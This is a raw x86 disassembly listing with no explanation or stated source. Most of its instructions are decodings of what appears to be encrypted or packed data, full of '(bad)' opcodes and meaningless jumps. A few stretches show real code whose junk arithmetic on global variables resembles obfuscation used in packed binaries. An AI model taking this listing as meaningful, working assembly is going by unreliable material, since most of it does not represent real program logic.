  417433:	ret    0xf622
  417436:	scas   al,BYTE PTR es:[edi]
  417437:	out    dx,al
  417438:	cld    
  417439:	jne    0x417446
  41743b:	int3   
  41743c:	cmp    al,0x98
  41743e:	in     al,dx
  41743f:	xchg   esp,eax
  417440:	xor    esp,ecx
  417442:	xor    BYTE PTR [esi],ah
  417444:	bound  eax,QWORD PTR [ebp+0x806f9e0]
  41744a:	add    DWORD PTR [eax-0x524e2379],0xdbc6f302
  417454:	push   edi
  417455:	jmp    0x41742b
  417457:	push   es
  417458:	pop    ecx
  417459:	in     eax,0x71
  41745b:	mov    al,0xa6
  41745d:	mov    eax,cs
  41745f:	xor    BYTE PTR [edx],0x1b
  417462:	push   cs
  417463:	fimul  WORD PTR [edi]
  417465:	rol    BYTE PTR [ebx],cl
  417467:	sbb    al,0x38
  417469:	icebp  
  41746a:	ror    BYTE PTR ds:0x9ad257d7,1
  417470:	pop    es
  417471:	xchg   edx,eax
  417472:	pop    ebp
  417473:	shl    BYTE PTR [edx+0xc],1
  417476:	adc    BYTE PTR [edi-0x47465972],bh
  41747c:	cmp    DWORD PTR [edx-0xa75d67c],0x30
  417483:	leave  
  417484:	ror    BYTE PTR [ecx],1
  417486:	push   DWORD PTR [eax]
  417488:	mov    bl,0x9e
  41748a:	fs mov esi,0xdbcccd78
  417490:	rol    BYTE PTR [edi],1
  417492:	add    BYTE PTR [esi-0x6d],bl
  417495:	mov    esp,0x457274c
  41749a:	push   esp
  41749b:	dec    ecx
  41749c:	lea    esp,[esp+ebx*4-0x42d4bf89]
  4174a3:	in     al,dx
  4174a4:	fisttp WORD PTR [edx]
  4174a6:	lock nop
  4174a8:	xor    bl,ah
  4174aa:	sahf   
  4174ab:	es fwait
  4174ad:	rcl    DWORD PTR [ebx],1
  4174af:	inc    DWORD PTR [ecx-0xa05e0ce]
  4174b5:	pop    es
  4174b6:	call   0x5bfeee49
  4174bb:	dec    edx
  4174bc:	dec    esi
  4174bd:	es pop edx
  4174bf:	xor    eax,ecx
  4174c1:	sub    edx,eax
  4174c3:	cmp    edi,edx
  4174c5:	jbe    0x4170cf
  4174cb:	pop    edi
  4174cc:	pop    esi
  4174cd:	pop    ebx
  4174ce:	leave  
  4174cf:	ret    0x8
  4174d2:	push   ebp
  4174d3:	mov    ebp,esp
  4174d5:	and    esp,0xfffffff8
  4174d8:	sub    esp,0x9c
  4174de:	push   ebx
  4174df:	push   esi
  4174e0:	push   edi
  4174e1:	push   DWORD PTR ds:0x4223c4
  4174e7:	lea    eax,[esp+0xa4]
  4174ee:	push   eax
  4174ef:	call   DWORD PTR ds:0x428e60
  4174f5:	push   DWORD PTR [esp+0xa4]
  4174fc:	push   DWORD PTR ds:0x4223b0
  417502:	call   DWORD PTR ds:0x428e84
  417508:	push   eax
  417509:	call   DWORD PTR ds:0x428e6c
  41750f:	mov    ecx,DWORD PTR ds:0x422778
  417515:	sub    DWORD PTR ds:0x4282ff,0x42837b
  41751f:	jmp    0x4178ee
  417524:	iret   
  417525:	and    ah,BYTE PTR [esi]
  417527:	inc    eax
  417528:	sbb    bh,BYTE PTR [edi+ebp*4]
  41752b:	and    cl,BYTE PTR [ecx+edx*8]
  41752e:	fnstcw WORD PTR [esi+esi*4+0xabca5d6]
  417535:	out    0x16,eax
  417537:	sbb    BYTE PTR [edx+edx*1-0x16b6e7e8],bh
  41753e:	inc    eax
  41753f:	loope  0x4174c2
  417541:	cli    
  417542:	or     BYTE PTR [eax],dh
  417544:	pop    ds
  417545:	(bad)
  417548:	and    eax,0x2b9464b6
  41754d:	fimul  DWORD PTR [ecx+0x6f]
  417550:	fcomp  QWORD PTR ds:0xc380027c
  417556:	cwde   
  417557:	add    al,0xd1
  417559:	and    eax,0x5087dca0
  41755e:	outs   dx,DWORD PTR ds:[esi]
  41755f:	addr16 cli 
  417561:	push   es
  417562:	aad    0x37
  417564:	cmp    dh,0x7
  417567:	xlat   BYTE PTR ds:[ebx]
  417568:	sbb    edx,DWORD PTR [edx]
  41756a:	adc    DWORD PTR [ecx],0xb61498a9
  417570:	out    0xf8,eax
  417572:	ja     0x41759b
  417574:	mov    fs:0xddd8f4bc,eax
  41757a:	xchg   BYTE PTR [ebp-0x3c],dh
  41757d:	scas   eax,DWORD PTR es:[edi]
  41757e:	push   es
  41757f:	pop    ss
  417580:	clc    
  417581:	cwde   
  417582:	push   esi
  417583:	imul   BYTE PTR [eax+eax*2-0x247a73ff]
  41758a:	jg     0x417530
  41758c:	hlt    
  41758d:	arpl   bp,bp
  41758f:	mov    WORD PTR [edi+0x24faa846],?
  417595:	mov    BYTE PTR [esi+ebp*2+0x7b],dl
  417599:	int3   
  41759a:	call   0xd67e:0xfe8772f
  4175a1:	mov    al,0x74
  4175a3:	jecxz  0x417588
  4175a5:	pop    ecx
  4175a6:	retf   0x89db
  4175a9:	sub    BYTE PTR [ebp-0x21],dh
  4175ac:	nop
  4175ad:	dec    eax
  4175ae:	mov    esi,0x1626f47c
  4175b3:	or     BYTE PTR [ecx+0x36e6bdd2],dl
  4175b9:	paddsb mm0,QWORD PTR [eax]
  4175bc:	dec    ebx
  4175bd:	lods   al,BYTE PTR ds:[esi]
  4175be:	xor    ax,0x9a4d
  4175c2:	ret    
  4175c3:	mov    bh,BYTE PTR [edx]
  4175c5:	or     al,0x5f
  4175c7:	jnp    0x417568
  4175c9:	seto   BYTE PTR [edx]
  4175cc:	out    0xa,eax
  4175ce:	xchg   ebx,eax
  4175cf:	inc    esi
  4175d0:	xchg   esp,eax
  4175d1:	pop    edi
  4175d2:	sub    cl,BYTE PTR ds:0x1a50c3ef
  4175d8:	mov    bl,0xf7
  4175da:	fild   WORD PTR [eax-0x369ca8e7]
  4175e0:	sbb    esi,eax
  4175e2:	(bad)
  4175e5:	dec    ebp
  4175e6:	mov    BYTE PTR [eax],ah
  4175e8:	jno    0x4175dd
  4175ea:	js     0x4175f1
  4175ec:	push   edx
  4175ed:	mov    WORD PTR [edx+0x2f10304],fs
  4175f3:	aas    
  4175f4:	adc    al,ah
  4175f6:	std    
  4175f7:	sub    eax,0xece152e9
  4175fc:	es jne 0x4175ed
  4175ff:	jae    0x41760d
  417601:	daa    
  417602:	nop
  417603:	rcl    DWORD PTR [ecx],1
  417605:	sahf   
  417606:	xchg   ebp,eax
  417607:	cwde   
  417608:	jb     0x41759b
  41760a:	daa    
  41760b:	mov    esp,0xa947178
  417610:	test   bh,ah
  417612:	xor    eax,0xd76504c9
  417617:	mov    DWORD PTR [eax+0x57],0xaa98f78b
  41761e:	popf   
  41761f:	and    edx,ecx
  417621:	fisttp DWORD PTR [ebp+0x3f]
  417624:	xor    al,0x28
  417626:	xchg   BYTE PTR [ecx+0x63],dh
  417629:	sub    eax,0xa8235311
  41762e:	in     eax,0x9
  417630:	retf   0xe596
  417633:	push   0x71
  417635:	stc    
  417636:	dec    eax
  417637:	ror    DWORD PTR [ecx+0x5a],1
  41763a:	mov    ebx,0xc61dbd22
  41763f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417640:	jns    0x41760c
  417642:	xchg   ecx,eax
  417643:	arpl   bx,bp
  417645:	jns    0x4176b6
  417647:	push   edi
  417648:	xor    DWORD PTR [edx],esp
  41764a:	(bad)  
  41764b:	(bad)  
  41764c:	pop    ebx
  41764d:	add    eax,0x2152a960
  417652:	repz add al,0xc1
  417655:	xor    bh,BYTE PTR [eax-0x19]
  417658:	dec    esp
  417659:	mov    ebx,0xd07b282d
  41765e:	pop    eax
  41765f:	fisttp QWORD PTR ds:0x6ab4abe5
  417665:	outs   dx,BYTE PTR ds:[esi]
  417666:	add    al,0x87
  417668:	outs   dx,DWORD PTR ds:[esi]
  417669:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41766b:	add    al,0x94
  41766d:	fwait
  41766e:	xchg   ecx,eax
  41766f:	les    ebx,FWORD PTR [ecx+0x3e]
  417672:	fist   WORD PTR [ecx-0x5d]
  417675:	xchg   cl,cl
  417677:	sbb    DWORD PTR [ebx+0x2449946c],edi
  41767d:	mov    DWORD PTR [edi+0x7b],eax
  417680:	pop    eax
  417681:	push   es
  417682:	int3   
  417683:	(bad)  
  417684:	cmp    eax,0xe9cdc560
  417689:	push   esp
  41768a:	fdivp  st(6),st
  41768c:	inc    esp
  41768d:	push   esi
  41768e:	fcmovnbe st,st(4)
  417690:	popf   
  417691:	push   ds
  417692:	in     al,dx
  417693:	cs mov dl,0x97
  417696:	(bad)  
  417697:	aam    0xae
  417699:	jne    0x41766f
  41769b:	(bad)  
  41769c:	sti    
  41769d:	sbb    eax,0x83cbff78
  4176a2:	inc    edx
  4176a3:	pop    eax
  4176a4:	pop    ebx
  4176a6:	push   ecx
  4176a7:	loopne 0x41765e
  4176a9:	sbb    eax,0xc25efa1b
  4176ae:	(bad)  
  4176af:	ins    DWORD PTR es:[edi],dx
  4176b0:	inc    esi
  4176b1:	mov    edx,0x1c4eae02
  4176b6:	xchg   edi,eax
  4176b7:	or     al,0x61
  4176b9:	push   esi
  4176ba:	inc    edi
  4176bb:	out    dx,al
  4176bc:	jnp    0x41772c
  4176be:	(bad)  
  4176bf:	std    
  4176c0:	push   ds
  4176c1:	fcmovnu st,st(2)
  4176c3:	mov    dl,0x53
  4176c5:	pop    ss
  4176c6:	sti    
  4176c7:	add    eax,0x65a589d8
  4176cc:	mov    WORD PTR [ecx+0x777ace69],cs
  4176d2:	out    dx,eax
  4176d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176d4:	call   0xedf39ca6
  4176d9:	xchg   ebx,eax
  4176da:	(bad)  
  4176db:	mov    ebx,0x2905a14d
  4176e0:	test   BYTE PTR [edx-0x3c296f24],ah
  4176e6:	dec    ebp
  4176e7:	repz add eax,0x5d3bff51
  4176ed:	enter  0xd2ed,0xc5
  4176f1:	add    al,0xa1
  4176f3:	js     0x417711
  4176f5:	test   eax,0xd1ee774b
  4176fa:	and    al,0xac
  4176fc:	pusha  
  4176fd:	jnp    0x41773e
  4176ff:	jae    0x41774f
  417701:	cmp    eax,0xde729e7f
  417706:	or     al,0xa3
  417708:	add    al,0xf9
  41770a:	imul   eax,DWORD PTR [ebp+0x5ee31925],0xffffffc6
  417711:	popf   
  417712:	inc    edx
  417713:	fadd   DWORD PTR [esi-0x28]
  417716:	lock dec ecx
  417718:	call   0x54be:0x4835c63d
  41771f:	lock lahf 
  417721:	bound  edi,QWORD PTR [ecx+esi*8-0x31473a05]
  417728:	ja     0x41774c
  41772a:	mov    al,0x33
  41772c:	mov    ss,WORD PTR [ecx]
  41772e:	dec    esi
  41772f:	repnz pop esp
  417731:	adc    eax,0xd6baa052
  417736:	mov    ?,edi
  417738:	adc    DWORD PTR [ebx],ebp
  41773a:	(bad)  
  41773b:	sbb    eax,0x25ea21a5
  417740:	or     eax,0x79de2959
  417745:	sbb    al,0x7
  417747:	and    DWORD PTR [eax+0x5d9885d9],edx
  41774d:	(bad)  
  41774e:	call   DWORD PTR [esi+0x3c]
  417751:	sub    DWORD PTR [ecx],edi
  417753:	xor    BYTE PTR [edx],0x54
  417756:	push   0x1b
  417758:	fsubr  QWORD PTR [ecx-0x6d1742b8]
  41775e:	inc    ecx
  41775f:	add    ecx,DWORD PTR [eax+0x12aa5279]
  417765:	test   DWORD PTR [esi],edx
  417767:	(bad)  
  417768:	xor    bh,al
  41776a:	out    0x14,eax
  41776c:	sub    DWORD PTR [esi],edx
  41776e:	sbb    BYTE PTR [edi+0x41b1f9af],ch
  417774:	enter  0x29c4,0x35
  417778:	add    DWORD PTR [esp+edi*1+0x6a74e192],esi
  41777f:	xchg   edi,eax
  417780:	popa   
  417781:	jl     0x417741
  417783:	cmp    BYTE PTR [ebp-0x8],0x44
  417787:	lods   al,BYTE PTR ds:[esi]
  417788:	lahf   
  417789:	bound  ebx,QWORD PTR [ebx]
  41778b:	xor    ebp,ebx
  41778d:	loope  0x4177e2
  41778f:	jns    0x4177d5
  417791:	ds in  al,0xc5
  417794:	mov    eax,ds:0x306179b0
  417799:	mov    edi,0x25f95ba1
  41779e:	push   ds
  41779f:	lea    esp,[ebp-0x64]
  4177a2:	jb     0x4177d1
  4177a4:	mov    ebx,0x92976908
  4177a9:	dec    esp
  4177aa:	std    
  4177ab:	popa   
  4177ac:	or     eax,0xc130079a
  4177b1:	jg     0x417750
  4177b3:	or     eax,eax
  4177b5:	sub    eax,0x24888110
  4177ba:	cmp    bl,ch
  4177bc:	and    bl,BYTE PTR [ebx]
  4177be:	jno    0x417790
  4177c0:	out    dx,eax
  4177c1:	add    DWORD PTR [edx+0x2e],0x4dc3ee3d
  4177c8:	xchg   ebx,eax
  4177c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177ca:	out    0xda,al
  4177cc:	push   0x42
  4177ce:	and    al,0x1
  4177d0:	dec    esi
  4177d1:	js     0x4177c7
  4177d3:	inc    edx
  4177d4:	cmp    DWORD PTR [esp+ebx*8],0xffffff97
  4177d8:	ret    0x24fe
  4177db:	in     eax,0xd
  4177dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177de:	aad    0xb8
  4177e0:	shl    BYTE PTR [ebp+eiz*8+0x33],1
  4177e4:	aaa    
  4177e5:	pop    esp
  4177e6:	clc    
  4177e7:	push   ecx
  4177e8:	adc    BYTE PTR [ebp+ecx*2+0x5],ah
  4177ec:	dec    edi
  4177ed:	sbb    eax,0x40731305
  4177f2:	aad    0x4a
  4177f4:	mov    ecx,DWORD PTR [ecx-0x42]
  4177f7:	lock hlt 
  4177f9:	push   cs
  4177fa:	(bad)  
  4177fb:	nop
  4177fc:	js     0x417827
  4177fe:	jle    0x417849
  417800:	das    
  417801:	add    al,BYTE PTR ds:0xd54c36ae
  417807:	jmp    0x417849
  417809:	mov    dh,0xc1
  41780b:	je     0x41778f
  41780d:	call   DWORD PTR ss:[ebx+0x4c]
  417811:	cmp    al,0x48
  417813:	shl    bl,cl
  417815:	je     0x417835
  417817:	pop    ss
  417818:	jbe    0x4177b9
  41781a:	cmp    eax,0x3471fcc
  41781f:	xchg   esp,eax
  417820:	xchg   esp,eax
  417821:	and    ebx,eax
  417823:	mov    bl,0xd4
  417825:	ds stos DWORD PTR es:[edi],eax
  417827:	in     al,dx
  417828:	inc    eax
  417829:	cli    
  41782a:	jo     0x4177b0
  41782c:	push   ss
  41782d:	cld    
  41782e:	jge    0x417899
  417830:	in     al,dx
  417831:	call   0x5a6e9339
  417836:	mov    DWORD PTR [edi],edi
  417838:	cmp    BYTE PTR [esi-0x3e],cl
  41783b:	in     al,0xdf
  41783d:	xchg   al,bl
  41783f:	push   0x5b
  417841:	ja     0x4177cf
  417843:	cmc    
  417844:	and    esp,DWORD PTR [eax]
  417846:	arpl   si,bp
  417848:	adc    edi,ebp
  41784a:	jg     0x417888
  41784c:	fcomp  QWORD PTR [eax-0x1f]
  41784f:	popf   
  417850:	adc    eax,DWORD PTR [esi]
  417852:	(bad)  
  417853:	xchg   edx,eax
  417854:	idiv   ecx
  417856:	xchg   esi,eax
  417857:	and    eax,0xa02db1f
  41785c:	or     BYTE PTR [ecx+ebp*4-0x364155d2],ch
  417863:	mov    BYTE PTR [edx+0x1b0afcf3],bl
  417869:	jbe    0x417811
  41786b:	icebp  
  41786c:	scas   al,BYTE PTR es:[edi]
  41786d:	cmp    eax,0x45683f06
  417872:	ins    BYTE PTR es:[edi],dx
  417873:	dec    ebp
  417874:	aam    0x1d
  417876:	or     DWORD PTR [edi+0x12],edx
  417879:	jae    0x417805
  41787b:	ins    BYTE PTR es:[edi],dx
  41787c:	call   0x182:0x90e0aa1a
  417883:	std    
  417884:	mov    bl,0x70
  417886:	pushf  
  417887:	sub    al,0xd1
  417889:	dec    ecx
  41788a:	fcmove st,st(1)
  41788c:	sub    ch,BYTE PTR [edx]
  41788e:	mov    al,0x72
  417890:	cmp    eax,0x8462560e
  417895:	int    0x3f
  417897:	fldl2t 
  417899:	add    al,0x68
  41789b:	clc    
  41789c:	push   0xffffff9a
  41789e:	jo     0x41787e
  4178a0:	sbb    ah,BYTE PTR ss:[edi]
  4178a3:	xchg   ebp,eax
  4178a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178a5:	rol    esp,0x81
  4178a8:	int3   
  4178a9:	dec    edi
  4178aa:	jp     0x417861
  4178ac:	xchg   esi,eax
  4178ad:	mov    ds:0xeca05672,eax
  4178b2:	test   ebp,ebp
  4178b4:	es hlt 
  4178b6:	jnp    0x417932
  4178b8:	push   ebx
  4178b9:	in     eax,0xc8
  4178bb:	stos   DWORD PTR es:[edi],eax
  4178bc:	mov    esi,0x1322c2a7
  4178c1:	push   edx
  4178c2:	mov    dl,BYTE PTR [ecx]
  4178c4:	ss cli 
  4178c6:	mov    ch,0xa0
  4178c8:	xchg   ebx,eax
  4178c9:	push   ds
  4178ca:	out    0x94,al
  4178cc:	xor    BYTE PTR [ebx+edi*2+0x62a62675],dl
  4178d3:	xchg   cl,al
  4178d5:	and    DWORD PTR [ecx],ebx
  4178d7:	add    eax,0xb9545e7d
  4178dc:	mov    bl,0xd0
  4178de:	cmp    BYTE PTR [edi-0x19379b21],cl
  4178e4:	sbb    BYTE PTR [ebx+0x69e8f0ed],dh
  4178ea:	test   eax,0x6a95eadb
  4178ef:	add    BYTE PTR [ecx+0x42829725],al
  4178f5:	add    BYTE PTR [esi-0xffff91],dh
  4178fb:	xor    DWORD PTR [ecx+0x4282370d],eax
  417901:	add    BYTE PTR [edi],ch
  417903:	add    BYTE PTR gs:[eax],al
  417906:	call   eax
  417908:	adc    esi,DWORD PTR ds:0x42824f
  41790e:	mov    esi,0x1ff
  417913:	add    eax,eax
  417915:	mov    DWORD PTR [esp+0x24],0x3992
  41791d:	mov    DWORD PTR [esp+0xc],0x79a2
  417925:	add    DWORD PTR ds:0x428237,0x3f4a
  41792f:	mov    eax,DWORD PTR [esp+0xc]
  417933:	mov    ecx,DWORD PTR ds:0x4282d7
  417939:	mov    ecx,DWORD PTR [ecx]
  41793b:	and    DWORD PTR ds:0x42829f,ecx
  417941:	mov    ecx,DWORD PTR [esp+0x24]
  417945:	sub    DWORD PTR ds:0x42824f,0x428257
  41794f:	xor    eax,0x1d22
  417954:	xor    DWORD PTR ds:0x428313,0x3de5
  41795e:	imul   eax,eax,0xffffdeb4
  417964:	and    eax,0x43eb
  417969:	sub    eax,ecx
  41796b:	xor    DWORD PTR ds:0x42826f,0x42819b
  417975:	mov    DWORD PTR [esp+0x3c],eax
  417979:	xor    DWORD PTR ds:0x42815b,0x24fe
  417983:	mov    DWORD PTR [esp+0x38],0x3b18
  41798b:	mov    DWORD PTR [esp+0x2c],0x6c93
  417993:	adc    DWORD PTR ds:0x42825f,0x3367
  41799d:	mov    DWORD PTR [esp+0x24],0x418e
  4179a5:	add    DWORD PTR ds:0x42829b,ebx
  4179ab:	mov    DWORD PTR [esp+0xc],0x5ac3
  4179b3:	xor    ecx,ecx
  4179b5:	add    ecx,DWORD PTR ds:0x4283a7
  4179bb:	add    DWORD PTR ds:0x42816b,ecx
  4179c1:	mov    eax,DWORD PTR [esp+0xc]
  4179c5:	mov    ecx,DWORD PTR [esp+0x24]
  4179c9:	add    DWORD PTR ds:0x428293,0x705
  4179d3:	sub    ecx,eax
  4179d5:	and    eax,0x1ffb
  4179da:	mov    eax,DWORD PTR [esp+0x2c]
  4179de:	and    ecx,eax
  4179e0:	mov    eax,DWORD PTR [esp+0x38]
  4179e4:	sbb    DWORD PTR ds:0x428153,0x42836f
  4179ee:	xor    ecx,0x10d6
  4179f4:	sub    ecx,0x782c
  4179fa:	imul   ecx,eax
  4179fd:	mov    eax,0x7fd0
  417a02:	mov    eax,DWORD PTR [esp+0x3c]
  417a06:	cmp    eax,ecx
  417a08:	mov    DWORD PTR ds:0x42816b,0x7353
  417a12:	jne    0x41890f
  417a18:	and    eax,eax
  417a1a:	mov    DWORD PTR [esp+0x10],0x1
  417a22:	mov    DWORD PTR [esp+0x30],0x2f16
  417a2a:	xor    ecx,DWORD PTR ds:0x428257
  417a30:	mov    DWORD PTR [esp+0x48],0x16f
  417a38:	mov    DWORD PTR [esp+0x50],0x30c5
  417a40:	add    DWORD PTR ds:0x4282f7,edx
  417a46:	push   DWORD PTR ds:0xe5bfd6f1
  417a4c:	cmp    DWORD PTR ds:0x428273,0x0
  417a53:	mov    DWORD PTR ds:0x4282ef,edx
  417a59:	mov    ecx,0x328
  417a5e:	mov    ecx,0x6d04
  417a63:	jmp    0x417abd
  417a68:	mov    DWORD PTR ds:0x428267,0x44f5
  417a72:	cmp    DWORD PTR ds:0x428273,0x0
  417a79:	je     0x417a9d
  417a7f:	push   DWORD PTR [ebp-0x18]
  417a82:	push   DWORD PTR [ebp-0x18]
  417a85:	push   0x8f00
  417a8a:	push   DWORD PTR [ebp-0x10]
  417a8d:	call   DWORD PTR ds:0x428de4
  417a93:	not    ecx
  417a95:	sub    ecx,ecx
  417a97:	or     DWORD PTR ds:0x428247,ebx
  417a9d:	mov    ecx,DWORD PTR ds:0x4282d3
  417aa3:	mov    ecx,DWORD PTR [ecx]
  417aa5:	and    DWORD PTR ds:0x42818b,ecx
  417aab:	sbb    ecx,0x5390
  417ab1:	add    ecx,0xb3f
  417ab7:	add    DWORD PTR ds:0x42819b,edi
  417abd:	mov    DWORD PTR [esp+0x8c],0x4ebc
  417ac8:	xor    eax,eax
  417aca:	mov    DWORD PTR [esp+0x98],0x76
  417ad5:	mov    DWORD PTR [esp+0x40],0x556d
  417add:	neg    DWORD PTR ds:0x42815f
  417ae3:	jmp    0x417eb2
  417ae8:	(bad)  [eax-0x2]
  417aec:	xor    BYTE PTR [edx+0x1a],bh
  417aef:	fwait
  417af0:	clc    
  417af1:	dec    edi
  417af2:	arpl   WORD PTR [ebx+eax*2-0x5141c23a],di
  417af9:	loope  0x417b11
  417afb:	sbb    BYTE PTR [edx+edx*1-0x5ce7e7e8],bh
  417b02:	mov    al,ds:0x1709df6
  417b07:	xchg   ecx,eax
  417b08:	int    0xae
  417b0a:	push   ecx
  417b0b:	pop    es
  417b0c:	test   al,0x1
  417b0e:	xor    DWORD PTR [ecx-0x4935a4ea],edx
  417b14:	out    dx,eax
  417b15:	cmp    eax,0xc3277347
  417b1a:	popf   
  417b1b:	mov    ds:0xdb78cd3a,eax
  417b20:	das    
  417b21:	push   eax
  417b22:	add    esp,DWORD PTR [edx+eax*1+0x1cf7dc97]
  417b29:	pop    edi
  417b2a:	cdq    
  417b2b:	into   
  417b2c:	push   edi
  417b2d:	pop    esi
  417b2e:	mov    eax,ds:0x8d693946
  417b33:	mov    ebx,0x1bf5abf
  417b38:	fst    QWORD PTR ds:0xdd6ffc38
  417b3e:	mov    esp,DWORD PTR [eax-0x19]
  417b41:	mov    ds:0x7bb330fe,eax
  417b46:	sub    BYTE PTR [ebp-0x18d5ff20],al
  417b4c:	lds    esp,FWORD PTR [ebx+0xa]
  417b4f:	sti    
  417b50:	out    dx,eax
  417b51:	stc    
  417b52:	sbb    al,0x2c
  417b54:	push   eax
  417b55:	pop    edi
  417b56:	lods   eax,DWORD PTR ds:[esi]
  417b57:	leave  
  417b58:	dec    BYTE PTR [edx-0x19af397b]
  417b5e:	and    DWORD PTR [ebx+ebp*1],esp
  417b61:	loopne 0x417b87
  417b63:	cld    
  417b64:	xchg   edx,eax
  417b65:	mov    ebp,0x61f5744
  417b6a:	pop    ss
  417b6b:	pop    esp
  417b6c:	dec    edi
  417b6d:	push   ds
  417b6e:	xlat   BYTE PTR ds:[ebx]
  417b6f:	inc    edx
  417b70:	push   0x38
  417b72:	sub    edi,DWORD PTR [ecx]
  417b74:	fdivr  DWORD PTR [eax+eax*4+0x40f9e1ee]
  417b7b:	dec    esi
  417b7c:	pop    ecx
  417b7d:	fnstcw WORD PTR ds:0xc006da58
  417b83:	sbb    cl,BYTE PTR [edx]
  417b85:	aas    
  417b86:	stos   BYTE PTR es:[edi],al
  417b87:	add    ah,0x90
  417b8a:	inc    ebx
  417b8b:	sub    ah,BYTE PTR [ecx-0x24]
  417b8e:	ja     0x417b12
  417b90:	into   
  417b91:	xor    ecx,ebx
  417b93:	cmp    esp,DWORD PTR [eax+edi*8-0x5dbdd873]
  417b9a:	mov    bl,0x5f
  417b9c:	cmp    ah,dh
  417b9e:	repz cdq 
  417ba0:	test   ebp,esp
  417ba2:	ss clc 
  417ba4:	cmp    ah,BYTE PTR [esi+0x23]
  417ba7:	shr    BYTE PTR [edi],0xb
  417baa:	bound  edx,QWORD PTR [esi-0x644aed86]
  417bb0:	and    BYTE PTR [edi+0x65471908],ah
  417bb6:	aaa    
  417bb7:	pop    ss
  417bb8:	sbb    al,dl
  417bba:	sub    ah,0x1e
  417bbd:	mov    ah,BYTE PTR [edi+0x75cc42f]
  417bc3:	pop    ss
  417bc4:	in     eax,0x73
  417bc6:	mov    ds:0x1ed44203,al
  417bcb:	lods   eax,DWORD PTR ds:[esi]
  417bcc:	pop    ds
  417bcd:	xor    DWORD PTR [esi-0x230d9baa],eax
  417bd3:	mul    dl
  417bd5:	mov    dl,0x99
  417bd7:	leave  
  417bd8:	mov    bl,BYTE PTR [ebp+0x3c]
  417bdb:	(bad)  
  417bdc:	xlat   BYTE PTR ds:[ebx]
  417bdd:	out    dx,al
  417bde:	in     al,dx
  417bdf:	retf   
  417be0:	add    al,0xfd
  417be2:	das    
  417be3:	push   0x71
  417be5:	xchg   edx,eax
  417be6:	pop    ds
  417be7:	push   eax
  417be8:	pop    edi
  417be9:	pop    ss
  417bea:	adc    DWORD PTR [ebx-0x7],esi
  417bed:	jle    0x417b91
  417bef:	in     eax,dx
  417bf0:	cdq    
  417bf1:	inc    edx
  417bf2:	and    ch,ch
  417bf4:	dec    eax
  417bf5:	shl    edx,cl
  417bf7:	xchg   ebx,eax
  417bf8:	inc    ebx
  417bf9:	call   0xc037:0x161d305
  417c00:	or     al,0xb8
  417c02:	adc    esp,DWORD PTR [ecx-0x4de3d0ac]
  417c08:	pop    ds
  417c09:	jne    0x417bbd
  417c0b:	repz sbb al,0x58
  417c0e:	add    edi,DWORD PTR [ebx]
  417c10:	xor    al,0x5a
  417c12:	lock shl BYTE PTR ds:0x198b2dc0,cl
  417c19:	shr    BYTE PTR [edx],1
  417c1b:	shl    BYTE PTR [eax],cl
  417c1d:	mov    DWORD PTR fs:[ebp-0x4b79c60b],0x42838b2
  417c28:	and    ebx,ebx
  417c2a:	xchg   esp,eax
  417c2b:	mov    eax,0x83be9619
  417c30:	mov    ch,0x2b
  417c32:	stos   BYTE PTR es:[edi],al
  417c33:	stos   DWORD PTR es:[edi],eax
  417c34:	cmp    DWORD PTR [edx+ebx*4-0x1df40c91],ebp
  417c3b:	pusha  
  417c3c:	out    0xd,eax
  417c3e:	jmp    0xa58d3c74
  417c43:	fs call 0x640e139e
  417c49:	cmp    eax,DWORD PTR [esi]
  417c4b:	stos   BYTE PTR es:[edi],al
  417c4c:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  417c4e:	iret   
  417c4f:	xchg   DWORD PTR [eax-0x17d35132],esi
  417c55:	mov    ah,BYTE PTR [ebx-0x6]
  417c58:	sbb    BYTE PTR [edi],al
  417c5a:	add    dh,BYTE PTR [ecx-0x37f96e74]
  417c60:	into   
  417c61:	mov    al,0x5b
  417c63:	xchg   ebx,eax
  417c64:	(bad)  
  417c65:	in     eax,dx
  417c66:	(bad)  
  417c67:	push   ds
  417c68:	ret    
  417c69:	mov    ebp,0x116a0612
  417c6e:	sub    BYTE PTR [ebx-0x46],al
  417c71:	leave  
  417c72:	sti    
  417c73:	das    
  417c74:	test   DWORD PTR [ebp-0x10c8d43],0x43f73e94
  417c7e:	xor    DWORD PTR [ebp+0x789e4035],esi
  417c84:	js     0x417cba
  417c86:	mov    DWORD PTR [ecx+0x9f6150b],edi
  417c8c:	shl    eax,1
  417c8e:	xchg   ebp,eax
  417c8f:	adc    edx,DWORD PTR [edi+eax*4-0x1c9852ab]
  417c96:	adc    BYTE PTR [ebp+0x12],al
  417c99:	sbb    DWORD PTR [esi+0x15870421],edx
  417c9f:	inc    ebx
  417ca0:	xchg   ebx,eax
  417ca1:	lahf   
  417ca2:	das    
  417ca3:	in     al,dx
  417ca4:	mov    ah,0xa9
  417ca6:	mov    BYTE PTR [esi],0x7f
  417ca9:	dec    DWORD PTR [edi]
  417cab:	pushf  
  417cac:	push   0xa72b5daa
  417cb1:	adc    BYTE PTR [ecx-0x4],bl
  417cb4:	mov    eax,0x26651384
  417cb9:	je     0x417c46
  417cbb:	adc    al,0x3b
  417cbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cbe:	sbb    al,0x91
  417cc0:	inc    edx
  417cc1:	test   bl,ah
  417cc3:	push   esp
  417cc4:	jmp    0xc752:0xc1ed4d01
  417ccb:	dec    eax
  417ccc:	or     DWORD PTR [ebx-0x4f],ebx
  417ccf:	pop    esp
  417cd0:	gs fwait
  417cd2:	je     0x417c5e
  417cd4:	inc    esp
  417cd5:	repz adc eax,0xca032052
  417cdb:	pop    ebx
  417cdc:	sub    al,0x9b
  417cde:	cli    
  417cdf:	ss sub esi,edi
  417ce2:	push   ebp
  417ce3:	jb     0x417d06
  417ce5:	jmp    0x50a1:0x6fbc587
  417cec:	push   ebx
  417ced:	jae    0x417c77
  417cef:	push   0x13555d8d
  417cf4:	add    BYTE PTR [edx],ah
  417cf6:	inc    ebx
  417cf7:	div    BYTE PTR [ebx-0x59]
  417cfa:	mov    esp,0x29822755
  417cff:	push   ebp
  417d00:	xchg   BYTE PTR [ecx-0x15],ch
  417d03:	(bad)  
  417d04:	mov    dh,0x79
  417d06:	rol    BYTE PTR [edx-0x1bcae1e8],1
  417d0c:	xchg   edx,eax
